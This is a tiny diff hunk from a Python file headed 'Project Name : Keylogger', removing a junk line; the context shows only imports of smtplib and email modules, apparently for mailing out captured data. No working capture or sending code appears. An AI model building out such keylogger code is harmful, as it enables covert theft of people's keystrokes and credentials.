@@ -4,7 +4,7 @@ Project Name : Keylogger
 Date Created : 27/02/2022
 '''
 
-asdasdadsas
+
 
 import smtplib
 from email.mime.multipart import MIMEMultipart
